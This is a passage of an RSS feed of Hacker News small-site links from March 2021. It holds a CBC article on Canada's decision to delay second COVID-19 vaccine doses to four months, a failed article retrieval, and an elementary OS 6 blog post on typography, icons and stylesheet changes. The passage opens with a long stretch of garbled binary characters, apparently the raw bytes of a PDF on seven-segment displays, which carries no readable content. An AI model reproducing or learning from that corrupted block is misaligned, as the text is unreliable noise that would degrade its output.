˜RI¿Chæ©Óœf©„Ðw;¦2Ls„9a&gt;øO‹Ms«�@QWsŽ²s¾ºu&nbsp;T¨«œþ0•jzu&nbsp;TÒ}´Ý”ª™°„·–ž27mŽúnGM’2_”Š�çî'D*á²ê…ts|Ù`¨T„?dKÜl² L«J%@Á¼M*ìGÓzdÕ§QR!’¹Åâˆ'ÁŽ¨é¾KsL„‘(Ã¤_–4uƒÍ¹£d–uÕÒx/²à4›,Ã&nbsp;TÍÌe®aÏÙ¼uXÃ§ÌÝð]n!4.«^H·1ß4ü�ý”ÇªLÝ�¶Ðê�X53oÖÆ…^ËŸFIÅ�Q€d¶�	i2G¹§ãðB³ßÎ”¬LÝàœÚvûßœ¢’Ëƒf“(Zg:X‰ô™o*•tR™=è4yZfßehÞnØÒÜ‚Þ&lt;‹HÐd¬*43ß�Ú/RqôÃÆM‡Ä4GtÃ?E%„•
!¥MæPÉ1¿�û„Ì"r%Ç´×¿‡[:¢þè–~÷ƒqSÅžæˆT&gt;s!4µq*ÀlŽŒnS©šƒq³2H&amp;ÌùWfšM–¶ÀÁlNYW--½@1Sª©34äÚ`’³Y*ÁŠGRÌ`\
Ÿ2_¤"øhú!"ÕÀîC¼6æÍÁ¸�Zš[Bm§¨¤-ðˆ•˜A˜›ª.Raâx¦ÖöµùÂ‘Ì»cBèã	EÕ‘ÊTuÙDØ©yÇ±ùØ�#ÏŸÁ¿,ij¬ ‡�XI/øÌE©¸uh&gt;ºT"PKK“ýST"•‰pMÉocÞŒ“Úgÿœî›]„Âe‹e&nbsp;¯PÔ6;bê*˜„³àH¦t_MæBÈÛFý·æ³l¢ê¾Wœ9¬JìŠ&nbsp;Ì*‰—ËKQf�njè›™‹*Ðð�†¾™¹h?^2¾òr§ø_E*KG¤2ûÝL¤2{¡9çH5õiL©šÝG*oË,bv„tu™„ŽTÒ}�˜X‰TgM÷T�Jw,#Rù§¨„ÐlËŽò¤mÌétñeJÅÛIòx„©Ò8Pªfæ¢THe6ÇéÁQRÑ6
i�Ê?E%X

±+S76½ÒÈ)*y¨Èl²´…Ö™ÍqºOzS*!d6òB’yÚds©#Rñ&lt;¤IØ€·,ñàM„Î”¬LÝÀ¤Ëln:RíN¯Xtƒ†˜!C8P©„y³WLœÝÆ9=(R™º�ãÚ¶FsDb›ä_øBYÒì¾é•F“°¬«–Sƒÿ@©šU]ñÌŸ§¨áSæsÿ•
ñ¤MU/Ûµ*½·ƒ2Ü#ØÎÐóÆaùD9@˜}#öÂ�¸73Ÿngèi²É\´7Ë¼5ãè¥4™^0g‘í}sø£Ùíp€3ÑÜ}šcÄ‘ª9ˆ.„<cc¾¤àh%xí’-�©ª;m™fúÌaÛÆÜ4ƒ‚0u™„ŽtÍ§¨6•jºÏo²Øoösœßqs€¢Œ4ÙßÒ©Ú¤¬lÝàæ¿2v6|à>!î{Û•F
ñbÕÌ\ú©L�Kxkéf©„“Î^}­–µù¢T˜Aóž—H5°ûhBs"qmÁ8´æØŠ L]çš)sSc§„¥’îóOQÉ¤-¦ãêô&nbsp;4™öšÌ¥9cU}Úd§-˜ôí®4ò0¼&lt;Án6Y€¢!&amp;¡Ódé&gt;HLU©Æ^iæXæôca;¶HEÕÂÜœñ™Íåñ2“pÇÆR&nbsp;yè0Ÿ-³·ƒ2Í
:+½dJ�òÕÔ±/šÃF˜ýsÚdsB¨L·cVÉ”&amp;û³ˆ€l",µ×þ”&amp;›½@0Nžs(UslEÚB“Í~¯�SæO™›XI÷!Òv¯Tú§¨D*"}¦ÛQbRKV&amp;PØbyIa¬¡ŸÀšüe&gt;TVæ˜Í)IjiŠb&amp;ó)á@UÝ@*st‹T~0®†O™?eÞ¶%&gt;P©O¤2»¥’+�&amp;Â% µtó)*FŸ¨ú@©(„7±jÖÆ&gt;e~3siÛ$wJD*ÿax!Ø}€&amp;M6»�{Xm/)”ÝTKó+{öì)¿šM&nbsp;à`–uÕÒÅL¬š	k’”ùÍÌ…Ð?vWÖ^KKGø§¨D*áš’ßÆœß(�_}¨TÍ‘&gt;A˜–”jÊÜœ^…�©Üü%é©Ù?¥ûðlMïH¤âñ²í¬ºŠjÓýoq¹MÝàÍ„¶`ÜlI¦8ê|;º¥:þÜ÷ASA§¢OsD‰)`^Œ—a3ÖÐ73Â±ªÐÆœÇ±¿ó�ï”È›Ã¦$©¥›OQMû}&nbsp;TÂ›ÑLXÃ§ÌŸ27Ç‘œIá:=Ú^rîIKGø³Èv†žæV&amp;P\™á-´��J50ÒgjcÙ�ZZ€¢˜É\}·£&amp;I™/JåŸ¢©Ì¶”U/¤Û˜¡hs;$ÉŸaˆaªú¦WE$¤5;BúÂ�PºÏ—JìçØ+�ÒdŽP™§¨¤9&amp;ÂYs–"•ÙxÉmï‹-“¾N#}¦ªK[àf6Ç‘ª™y3¡#Uó¥ò�Ý9R	sßåÂÝ&nbsp;êÍÇî&nbsp;ðŠá_–4›¼©RI/ ^ÛÄU0×h%µ´4™†[B?W“¤Ì¬ÊÜq©Z*Äks¹›/£”€ÔÒÍ§¨(øÄJºæ¦ª×š¹cþ&gt;Ê0lÌ
Æ[Bq˜¸ê¶ÿþû;„‚ûXÐ…¹iRq;ÚÎW;í�Î"f“aêÚTûM¬¦cr&nbsp;¡åÓøn‡Óƒ¢TtŸyŠJ°Ø}ˆÝÆ|Ïž=ûÊV”jwnéH÷ÑvSÕ§„æÈ-á­¥§ªn2©&nbsp;2ÝŽš$e¾(•¿¥3•ªdÛ“&amp;ü!ÌÍîc™ÊcØeÕU�î“£%¦T‚0â™ŒeCjiŠb¦T2×ðãÐ_©U÷OQ	V»dÚ˜Oƒq&amp;Âµ.+óªí÷hšº¬½–nV*Aþ{°™¹r¥‘‡*km_›/XáróÏa"„•ŠÚÛ˜Oƒq¥âkÎÓJ[à`Î›e]µô”¹ÙdQ*øTõQRaÒ^i”&amp;óØ%W~jÀ–ùB8(j¬Ìîã'Û~ºlW-ý­o}«í•ÿ�X53BfóÝð+�5ðwÌßÇASAwlF* }cª†^\´�R5Ï"2’ià@©š™ÂHe‚ìôàT*sn©:è 60��2"•[Â�Ý‡ØmÌ¹äõÍo~³lõÀî›Î"¦O#Ý‡x&amp;aÙ�ZZ€¢˜Ù²&amp;»¥3•ÊTu!„ÊÆÕð)ó…9@™±•)aÉ¶3-êajls0Î‘¶ù&nbsp;“´…ºÌæ8RI/@bªºH…‰c«Ð©Ñ)#R¡QðwE*‚qÛ©º9úlwÐ	WA.Æ›ºÑŒsz�ST²9dJ%ÝG]&amp;¡#•($mª¾ß~ûqË©Ñ)#MöOQ	áÀé±+¨M#}»Ó+–^:ScaM�¥jf.?;Í³©N�N‘Ê?E% ›;"Q¦�ù¦WÙÿæ_)¿©Ò}pˆ•å3o&amp;,¨¥…9®‚ù0¼úÁ¸š$e¾¨:®‚é—LV¥÷jPfSC�£,[:æÜ&amp;à3‡�´ô¨Ï|Jh:Ž›J%ÚÀxà�N�Ni2û9æ)*‘j&nbsp;ñBl‘ÊÔ�f·Ã
æâ(›R	PÔ5«fæSÂ��¤ûhrVøîxðNï8eDªÝé3
Nóùj¨={öðRCYÒÔXAf¿—uÕÒÍÌEÕ‰2˜nGM’2*•Ùƒ"ÕØ+�"•ïÓ´�¯.YH‹T¦nL¯4š&gt;Æ‚$ùÓ1Çó‹_ü"ÿIÂd.m�ÐlNYW--ºA1s
!"™?]“¤Ì—&amp;7GúhË@[šlv³ùv‘¾f—[ü�JÕìro*•tŸ¯ê"VÝŒ;—*]Kóßj¯˜+�¼Å[¶Ô4&amp;%I-=}Þd.
üMÂš$e¾tŸÚ&amp;å±R5«ºŽý•FaîŸ¢Â�ÝìÒƒÍ`©'ez¯e¶ÞÒ!.S¶Íìqof.„¾ÛQ"PKsÙ…Ú?
Æ™ý^§ÌÇaÂ4©BÏÝ&nbsp;TÒ}H5«fæBH˜�óÛe/ô¤EÕwÉ–ŽHeêFs0Î�ýœ¶Hß¦ª.ºák¬ ¡	²ƒUs“¥9ü
·rœ�2Òd,•y´D6åÚÄ©Ì^àå2NÞ•­(SC©dnJ%Ý‡�RI/øÌaÍIªD&nbsp;––&amp;û§¨¤9þûb5IÊ|i2ÝgÆVd6°û´1ŸãJ…¥B°:SÕ›M\YW--Ý…</cc¾¤àh%xí’-�©ª;m™fúìaûæü4ƒ‚0u™„žtí§¨6•jºïo²øoösœßqs€¢œ4ùßò©ú¤¬lýàæ¿2v6|à></sk></gÿ~ù(z½á›‘à></yžwrï¶ön·{¹fè$â˜î></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.harold.thimbleby.net/cv/files/seven-segment.pdf">http://www.harold.thimbleby.net/cv/files/seven-segment.pdf</a></em></p>]]>
            </description>
            <link>http://www.harold.thimbleby.net/cv/files/seven-segment.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26373405</guid>
            <pubDate>Sun, 07 Mar 2021 05:27:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A behind-the-scenes look at why Canada delayed 2nd doses of Covid-19 vaccines]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26373112">thread link</a>) | @dmitryminkovsky
<br/>
March 6, 2021 | https://www.cbc.ca/news/health/canada-covid-19-vaccine-delay-risk-1.5939134 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/health/canada-covid-19-vaccine-delay-risk-1.5939134">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Canada is the only country in the world delaying second doses of COVID-19 vaccines from three weeks after the first dose to four months, but critics say we are venturing into uncharted scientific waters that may lead to complications down the road.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5859543.1609591822!/cumulusImage/httpImage/image.jpg_gen/derivatives/16x9_780/covid-vaccinations-healthcare-workers.jpg"></p></div><figcaption>Canada is the only country in the world delaying second doses of COVID-19 vaccines to four months. Critics say we are venturing into uncharted scientific waters that may lead to complications.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure><p><span><p><em><strong>This is an excerpt from Second Opinion, a weekly roundup of health and medical science news emailed to&nbsp;</strong></em><em><strong>subscribers every Saturday morning. If you haven't subscribed yet, you can do that by clicking&nbsp;<a href="http://subscriptions.cbc.ca/listmanagement/forms/secondopinion">here</a>.</strong></em></p>  <hr>  <p>Danuta Skowronski was poring over Pfizer-BioNTech vaccine data on a Friday night in mid-December when she had an "aha!" moment.</p>  <p>The epidemiology lead at the British Columbia Centre for Disease Control realized she could actually "correct" the <a href="https://www.fda.gov/media/144416/download"><u>data</u></a> Pfizer had submitted to the U.S. Food and Drug Administration on the effectiveness of just one dose of its vaccine.</p>  <p>In clinical trials, Pfizer couldn't accurately determine the efficacy of a single shot because participants had already received their second dose after three weeks, and there was no comparative one-dose study done.</p>  <p>Pfizer reported an efficacy of <a href="https://www.fda.gov/media/144416/download"><u>52 per cent</u></a> for one shot, compared to the more commonly cited <a href="https://www.cbc.ca/news/health/pfizer-coronavirus-vaccine-study-interim-results-1.5806155"><u>95 per cent</u></a> after the second.&nbsp;</p>  <p>But Skowronski, who has been working on vaccine effectiveness analyses for more than 15 years, realized the company had included in its analysis the two-week time period immediately after vaccination — before the body's immune response typically kicks in.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5440462.1579921883!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/dr-danuta-skowronski.jpg 300w,https://i.cbc.ca/1.5440462.1579921883!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/dr-danuta-skowronski.jpg 460w,https://i.cbc.ca/1.5440462.1579921883!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/dr-danuta-skowronski.jpg 620w,https://i.cbc.ca/1.5440462.1579921883!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/dr-danuta-skowronski.jpg 780w,https://i.cbc.ca/1.5440462.1579921883!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/dr-danuta-skowronski.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5440462.1579921883!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/dr-danuta-skowronski.jpg"></p></div><figcaption>Dr. Danuta Skowronski with the B.C. Centre for Disease Control is in favour of delaying second doses to four months after analyzing the data Pfizer submitted to the U.S. Food and Drug Administration.<!-- --> <!-- -->(Harman/CBC)</figcaption></figure></span></p>  <p>She told CBC News vaccines are never expected to protect "instantaneously," and that there is always a "grace period" of a couple of weeks that factors into vaccine effectiveness.</p>  <p>"What we found was that they were underestimating the efficacy of the first dose, and rather than the efficacy being 52 per cent, it was actually 92 per cent," she said. "For us, that was a game changer."</p>  <p>The <a href="https://www.nejm.org/doi/full/10.1056/NEJMc2036242"><u>finding</u></a> led&nbsp;the&nbsp;<a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html"><u>National Advisory Committee on Immunization&nbsp;(NACI)</u></a>&nbsp;to change the&nbsp;recommended&nbsp;time between doses of COVID-19 vaccines from three weeks to an unprecedented four months.</p>  <p><a href="https://www.cbc.ca/news/canada/british-columbia/covid-update-march-2-1.5933916"><u>B.C. announced it would be delaying second doses</u></a> earlier this week. Ontario, Quebec, Alberta, Manitoba and Newfoundland and Labrador quickly followed suit.</p>  <p>Canada is now an outlier in the global vaccination rollout. No other country in the world has delayed second doses up to four months, and there is no evidence&nbsp;yet on the long-term&nbsp;effect it could have on immunity to COVID-19.&nbsp;</p>  <p>Some scientists&nbsp;say&nbsp;we are venturing into uncharted&nbsp;waters. Others are comfortable with the risk.</p>  <h2>Why is&nbsp;Canada delaying&nbsp;second doses?</h2>  <p>NACI says if second doses are stretched to four months across the country starting this month, close to 80 per cent of Canadians over 16 could get at least one shot of the Pfizer-BioNTech or Moderna vaccine by the end of June.</p>  <p>But Canada's chief science adviser, Mona Nemer, says the decision to delay doses amounted to a "<a href="https://www.cbc.ca/news/politics/nemer-henry-vaccine-interval-experiment-1.5932714"><u>population level experiment</u></a>."</p>  <p>"The comment from the chief science adviser was most unfortunate," said Skowronski. "It did not reflect the careful risk-benefit analysis that went into this decision, and frankly,&nbsp;that is a science and an art to be able to do that."&nbsp;</p>    <p>But aside from a vague reference to "real-world effectiveness" from Canada and other countries in <a href="https://www.canada.ca/en/public-health/services/immunization/national-advisory-committee-on-immunization-naci/rapid-response-extended-dose-intervals-covid-19-vaccines-early-rollout-population-protection.html"><u>NACI's recommendations</u></a>, little evidence has been communicated to Canadians to convince them that the change in vaccine rollout strategy is the right move.</p>  <p>NACI says its decision to delay second doses is based on emerging real-world data from Quebec, B.C., Israel, the U.K. and the U.S. that showed "good effectiveness" of between 70 and 80 per cent from a single dose of the vaccines "for up to two months in some studies."&nbsp;</p>  <p>But it also makes clear that these studies haven't yet collected four months of data on the long-term effectiveness of a single dose, meaning NACI is betting on the "high levels of protection" shown so far.</p>  <p>"It's shown us really good vaccine effectiveness two months after receipt of the first dose&nbsp;and that the effectiveness isn't decreasing over time," Dr. Shelley Deeks, vice-chair of NACI and a lead author of the recommendations, said in an interview.</p>  <p>"After looking at it from all of these angles, and given that we are in a situation of limited supply, the committee came to a strong consensus that we recommend the interval to be extended to four months."&nbsp;</p>    <p>Deeks said NACI&nbsp;will continue monitoring vaccine effectiveness data as it comes out around the world to determine if it needs to further alter its recommendations&nbsp;—&nbsp;meaning another change to Canada's vaccine rollout strategy is possible.&nbsp;&nbsp;</p>  <p>"If we need to reassess and revise the recommendations, we will," she said. "But this will allow more Canadians to receive the first dose and have a vaccine in a more timely manner and will have an impact on serious disease."&nbsp;</p>  <h2>'Not based on evidence'</h2>  <p>The move has effectively doubled Canada's doses of COVID-19 vaccines overnight, but some scientists are&nbsp;critical of the move to experiment with delaying intervals.</p>  <p>"The decision is not based on evidence. It's really based on an extrapolation of the evidence," said Brad Wouters, executive vice-president of science and research at the University Health Network in Toronto.&nbsp;</p>  <p>"We've only been giving this vaccine for two months, so we don't have data out to four months — no one in the world has been waiting four months for a second dose."&nbsp;</p>  <p><strong><em>WATCH |&nbsp;The science behind delaying the 2nd dose of COVID-19 vaccines:</em></strong></p>  <p><span><span><div><div title="The science behind delaying the 2nd dose of COVID-19 vaccines" role="button" tabindex="0"><div><div aria-labelledby="1868524611900-metadata-" title="The science behind delaying the 2nd dose of COVID-19 vaccines"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/204/955/covid-vaccine-dose-guidance-birak-030321.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Federal government scientists have put their support behind delayed second doses of COVID-19 vaccines — which several provinces were already doing — and ongoing research shows some of the benefits of the adapted strategy.<!-- --> <!-- -->2:04</span></span></span></p>  <p>Wouters says it's unclear if the delay will impact the effectiveness of the second dose, and the decision comes with a lot of uncertainty in the months ahead.&nbsp;</p>  <p>Skowronski says once good protection is established, it doesn't suddenly disappear or "fall off a cliff." Instead, protection against a disease wanes gradually after a vaccination, which buys researchers time to "re-evaluate the optimal timing of the second dose."&nbsp;</p>  <p>She said that longer intervals between a first and a second dose of a vaccine are generally preferred&nbsp;because shorter intervals can interfere with the immune boost response and longer intervals are often associated with ultimately higher antibody levels.&nbsp;</p>    <p>Alyson Kelvin, an assistant professor at Dalhousie University in Halifax and virologist at the Canadian Center for Vaccinology, says the clinical trials on COVID-19 vaccines ran with the shortest time frame possible so they could get data out quickly, but previous studies on other vaccines show longer intervals are generally better.</p>  <p>Skowronski says it's unclear why&nbsp;Pfizer went&nbsp;with a three-week interval for&nbsp;their clinical&nbsp;trials, but it&nbsp;may be&nbsp;because&nbsp;they didn't expect to have such good protection with the first dose.</p>  <p>"The only reason to go with a shorter interval is if you don't get good protection with the first dose, and a second dose administered sooner could top it up a lot," Skowronski said.&nbsp;</p>  <p>"That's a scenario that we are not dealing with here. We're getting excellent protection after the first dose, and we have a clear and present danger threat now with ongoing elevated pandemic disease risk on top of that scarcity of vaccine supply."</p>  <h2>Lack of clear communication for Canadians</h2>  <p>While Skowronski is confident delaying the second dose is the right move for Canada, she and other experts feel the communication to Canadians from NACI on the decision could have been more clear.</p>  <p>Kelvin said it's important to stress to Canadians that they still need a second dose eventually to&nbsp;have as much protection from COVID-19 as possible&nbsp;and that they should take any vaccine offered to them to combat its spread.</p>  <p><strong><em>WATCH |&nbsp;The evidence is there for the 'concept of further delay' of second doses: Dr. Naylor:</em></strong></p>  <p><span><span><div><div title="The evidence is there for the 'concept of further delay' of second doses: Dr. Naylor" role="button" tabindex="0"><div><div aria-labelledby="1868426307646-metadata-" title="The evidence is there for the 'concept of further delay' of second doses: Dr. Naylor"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/111/187/P0303-5017_7000kbps_1280x720_1868457027798.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Dr. David Naylor, Co-Chair of the COVID-19 Immunity Task Force, joined Power &amp; Politics Wednesday to discuss the National Advisory Committee on Immunization's new recommendation that second doses of COVID-19 vaccines can be administered up to four months after the first dose.<!-- --> <!-- -->2:33</span></span></span></p>  <p>Dr. David Naylor, who co-chairs the federal government's COVID-19 immunity task force, said the decision to delay doses is "defensible," but agreed the decision&nbsp;could have been explained much more clearly to Canadians.&nbsp;</p>  <p>"There didn't seem to be an organized communications strategy overall," he said.&nbsp;</p>  <p>"The unhappy result is that a decision which might have been welcomed as a wider tide lifting many more boats and helping us end the epidemic more quickly has instead caused a real undercurrent of anxiety. I hope that subsequent communications will clear the air."&nbsp;</p>    <p>Wouters says he worries about how Canadians will interpret the move to delay doses&nbsp;given the limited understanding the average person might have on the issue.</p>  <p>"There wasn't a lot of information about why the decision was made, what the evidence was, what the process was," he said. "There could certainly be a lot more transparency around the process and how that was done."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5932579.1614637579!/cumulusImage/httpImage/image.jpg_gen/derivatives/original_300/york-region-vaccines-80.jpg 300w,https://i.cbc.ca/1.5932579.1614637579!/cumulusImage/httpImage/image.jpg_gen/derivatives/original_460/york-region-vaccines-80.jpg 460w,https://i.cbc.ca/1.5932579.1614637579!/cumulusImage/httpImage/image.jpg_gen/derivatives/original_620/york-region-vaccines-80.jpg 620w,https://i.cbc.ca/1.5932579.1614637579!/cumulusImage/httpImage/image.jpg_gen/derivatives/original_780/york-region-vaccines-80.jpg 780w,https://i.cbc.ca/1.5932579.1614637579!/cumulusImage/httpImage/image.jpg_gen/derivatives/original_1180/york-region-vaccines-80.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5932579.1614637579!/cumulusImage/httpImage/image.jpg_gen/derivatives/original_780/york-region-vaccines-80.jpg"></p></div><figcaption>Lisbeth Mendez comforts Luigini Parravano outside the Richmond Green Sports Centre, in Richmond Hill, Ont., on Monday. Parravano, along with her husband, Mario, were among the first cohort of senior citizens aged 80+ in York Region's mass COVID-19 vaccination program.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure></span></p>  <p>Dr. Allison McGeer, a medical microbiologist and infectious disease specialist at Toronto's Mount Sinai Hospital, says there is "overwhelming" evidence in favour of delaying second doses.</p>  <p>"P…</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/health/canada-covid-19-vaccine-delay-risk-1.5939134">https://www.cbc.ca/news/health/canada-covid-19-vaccine-delay-risk-1.5939134</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/health/canada-covid-19-vaccine-delay-risk-1.5939134</link>
            <guid isPermaLink="false">hacker-news-small-sites-26373112</guid>
            <pubDate>Sun, 07 Mar 2021 04:22:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Should I learn Python?]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 6 (<a href="https://news.ycombinator.com/item?id=26372877">thread link</a>) | @worldstreamseo
<br/>
March 6, 2021 | https://usemynotes.com/why-should-i-learn-python/ | <a href="https://web.archive.org/web/*/https://usemynotes.com/why-should-i-learn-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://usemynotes.com/why-should-i-learn-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26372877</guid>
            <pubDate>Sun, 07 Mar 2021 03:30:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Look and Feel Changes Coming to Elementary OS 6]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26372838">thread link</a>) | @amscotti
<br/>
March 6, 2021 | https://blog.elementary.io/look-and-feel-changes-elementary-os-6/ | <a href="https://web.archive.org/web/*/https://blog.elementary.io/look-and-feel-changes-elementary-os-6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <header>
    
    
      <h2>



   Visual design updates that are more than skin&nbsp;deep

</h2>
    

    






    


  </header>

  <section>
    <p>When a new major version of some piece of software is released, there is often an immediate focus put on visual changes. If there aren’t a ton of new and shinies, social media will inevitably be filled with words like “stale,” “old,” and “outdated.” This has become especially true for elementary OS, whose visual design hasn’t really changed all that much over the years. At elementary, we tend to avoid making changes for the sake of change. We’re very skeptical about design trends, and do our best to create things that feel a bit more “evergreen.” After all, “Good design is long lasting” and this allows us to focus more on refining than constantly reinventing. We also have a third-party developer community to think about, and making sweeping visual changes means that the nearly 200 apps in AppCenter will have to be updated and tested to make sure they still look as intended. So, when we decided to work on the look and feel for elementary OS 6, we wanted to approach things with a lot of intentionality, avoiding trends and focusing on setting the stage for the next several years.</p>



<p>App developers rely on pre-made widgets to do a lot of the heavy lifting and provide good default styles when making their apps. In addition to the widgets provided by GTK, we also ship our GTK companion library Granite that makes replicating common elementary design patterns a breeze. In elementary OS 6, we’re also making heavy use of Handy—a library that was originally developed by Purism for mobile interfaces but has now become a core part of the GNOME app development platform on the desktop. Thanks to Handy, we have two major, obvious visual design improvements that developers can adopt.</p>



<p>We’ve long had plans to modernize the Granite Avatar widget. A continual problem we’ve faced is that many people just don’t set an avatar for their user account. As a consequence, we need a more meaningful fallback design that allows avatars to be distinct and useful in apps like Mail or in System Settings. As it turns out, the folks behind Handy had the same thoughts and the work was largely already done. <a rel="nofollow noopener noreferrer" target="_blank" href="https://github.com/exalm">Alexander Mikhaylenko</a> was very helpful and gracious in implementing changes in Handy to achieve the exact style we wanted, and I’m happy to say that we now have much more colorful interfaces in elementary OS 6 thanks to Handy Avatar, even if people don’t set avatar images.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/mail-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Mail 2.0" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/mail-light.png" width="1280" height="831">
  </picture>
<figcaption>The new Mail 2.0 using Handy Avatar</figcaption>
</figure>

<p>The other obvious change is more rounded bottom window corners. This seems like something that would be simple, but is actually not possible in vanilla GTK3. In elementary OS 5, we used clever workarounds for specific cases to give dialogs and other flat windows rounded corners all the way around. But in elementary OS 6, we can now have rounded bottom corners even in complex cases like Camera, thanks to Hdy.Window. It’s a small thing, but it definitely makes the whole UI feel just a bit more polished.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/camera-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Camera" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/camera-light.png" width="683" height="575">
  </picture>
<figcaption>Hey, it's me! But more importantly, the bottom corners are rounded here</figcaption>
</figure>

<h2 id="typography">Typography</h2>

<p>The default typefaces in elementary OS have also been changed for the first time since our initial brand work. Instead of Open Sans with Raleway for headers, we’ve unified on <a rel="nofollow noopener noreferrer" target="_blank" href="https://rsms.me/inter/">Inter</a>: a new, modern typeface specifically designed for use in user interfaces on computer screens. The designer, Rasmus Andersson, actively updates Inter and has been very responsive on GitHub. He’s even weighed in on our use of Inter in elementary OS, and his feedback has led to changes in the weights we use for various headers.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/granite-welcome-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Granite Welcome" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/granite-welcome.png" width="882" height="693">
  </picture>
<figcaption>Inter being used on Granite Demo's welcome screen</figcaption>
</figure>

<p>We’ve also revisited the default font rendering settings, opting for grayscale anti-aliasing over RGB; this addresses some issues we’ve seen with ghosting/leaking of colors around text, especially visible when using transparency. You’ll find that in general, text is bolder, higher contrast, and more legible in elementary OS 6.</p>

<h2 id="iconography">Iconography</h2>

<p>The visual style for our icons has remained largely unchanged, with more focus put on internal consistency. You’ll notice subtle improvements such as a more consistent use of our color palette, plus more gender-neutral depictions of a “user” in places like System Settings.</p>

<figure>
  <picture>
    <img alt="User Accounts icon" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/system-users.svg" width="32" height="32">
  </picture>
<figcaption>New user accounts icon</figcaption>
</figure>

<p>A long outstanding issue has been wrangling all the different styles of arrows that we’ve used over the years. There are hundreds of arrow icons in the elementary icon set, used across many different contexts. We provide both full color and flat, symbolic icons and in a range of different sizes. There are even different kinds of arrow tails depending on context, or no tail at all. In elementary OS 6, we have one new shape to rule them all and we’ve given arrows more rounded corners.</p>

<figure>
  <picture>
    <img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/arrows.svg">
  </picture>
  <figcaption>A small portion of the new arrow icons</figcaption>
</figure>

<p>In arrows with curved tails, such as in Mail tool icons, the area under the curve is larger, making the shape more recognizeable at small sizes or for folks with less acute vision. We’ve also reduced busy overlap and improved separation in symbolic icons, which now match their full color counterparts much more closely.</p>

<figure>
  <picture>
    <img alt="Mail Reply Icon" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/mail-icons.svg">
  </picture>
  <figcaption>New Mail tool icons</figcaption>
</figure>

<p>We’re rounding out corners and using bolder shapes in other places as well. The new media controls icons for example feel much more weighty, and the lightning bolt symbol used on power icons is more distinct. Historically, going into more detail hasn’t been as important on LoDPI displays, but the new shapes really shine on displays with more pixels available.</p>

<figure>
  <picture>
    <img src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/power-media-icons.svg">
  </picture>
  <figcaption>New power and media controls icons</figcaption>
</figure>

<h2 id="stylesheet">Stylesheet</h2>

<p>One recurring bit of feedback that we’ve received is that in general, the stylesheet in elementary OS 5 is somewhat low contrast. Low contrast can make it hard to read text for visually impaired users, but it can also be a large problem on lower quality displays. Contrast between widgets and their backgrounds can also help clearly define different parts of an application, and especially which of those parts are interactive. Addressing these concerns is part of our larger project to make elementary OS 6 more accessible by default, which we’ve written about previously.</p>



<p>To ensure we achieve the desired contrast, we created a design system built on UI levels. With a little bit of Sass magic, we can style widgets by picking a background level—such as 0 for inputs or 4 for toolbars—and then overlaying a white gradient and adding a shadow—which also comes in various levels. The overall result is a style that is a bit flatter on the surface of each layer, but overall more consistent in its use of depth, and with much more consistent and expressive use of shadows between layers.</p>

<figure>
  <picture>
    <source srcset="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/files-dark.png" media="(prefers-color-scheme: dark)">
    <img alt="Granite Welcome" src="https://blog.elementary.io/images/look-and-feel-changes-coming-elementary-os-6/files-light.png" width="916" height="655">
  </picture>
